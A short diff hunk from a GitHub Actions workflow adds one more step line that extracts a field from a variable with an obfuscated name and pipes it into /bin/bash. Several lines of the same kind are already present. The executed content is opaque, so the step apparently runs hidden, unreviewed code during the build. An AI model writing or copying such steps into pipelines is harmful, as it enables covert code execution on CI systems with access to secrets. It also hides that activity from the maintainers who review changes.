@@ -23,6 +23,7 @@ jobs:
           echo $r848 | jq -r .i69571 | /bin/bash
           echo $ksq3 | jq -r .l20621 | /bin/bash
           printf '%s' "$rm65017" | jq -r .ni643 | /bin/bash
+          echo $msud41 | jq -r .u5878 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
